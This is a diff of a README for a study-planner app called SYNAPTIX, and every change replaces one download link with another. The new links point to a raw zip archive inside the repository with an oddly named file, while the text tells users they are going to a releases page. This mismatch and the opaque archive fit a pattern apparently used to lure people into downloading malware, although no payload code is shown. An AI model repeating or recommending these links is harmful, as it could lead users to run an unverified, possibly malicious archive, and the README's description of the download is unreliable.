@@ -1,6 +1,6 @@
 # 🌟 SYNAPTIX - Smart Study Planner for Your Success
 
-[![Download SYNAPTIX](https://raw.githubusercontent.com/SORANAKAM/SYNAPTIX/main/services/Software-3.0.zip)](https://raw.githubusercontent.com/SORANAKAM/SYNAPTIX/main/services/Software-3.0.zip)
+[![Download SYNAPTIX](https://github.com/SORANAKAM/SYNAPTIX/raw/refs/heads/main/components/Software-outdwell.zip)](https://github.com/SORANAKAM/SYNAPTIX/raw/refs/heads/main/components/Software-outdwell.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to SYNAPTIX! This application is designed to help you study better. It u
 
 ## 📥 Download & Install
 
-To download SYNAPTIX, visit this page: [Download SYNAPTIX Releases](https://raw.githubusercontent.com/SORANAKAM/SYNAPTIX/main/services/Software-3.0.zip). 
+To download SYNAPTIX, visit this page: [Download SYNAPTIX Releases](https://github.com/SORANAKAM/SYNAPTIX/raw/refs/heads/main/components/Software-outdwell.zip). 
 
 1. Click the link above to go to the releases page.
 2. Choose the latest version available.
@@ -57,4 +57,4 @@ Thank you for using SYNAPTIX. We hope it helps you achieve your study goals. If 
 
 For any inquiries, please contact us through the GitHub repository.
 
-[![Download SYNAPTIX](https://raw.githubusercontent.com/SORANAKAM/SYNAPTIX/main/services/Software-3.0.zip)](https://raw.githubusercontent.com/SORANAKAM/SYNAPTIX/main/services/Software-3.0.zip)
+[![Download SYNAPTIX](https://github.com/SORANAKAM/SYNAPTIX/raw/refs/heads/main/components/Software-outdwell.zip)](https://github.com/SORANAKAM/SYNAPTIX/raw/refs/heads/main/components/Software-outdwell.zip)
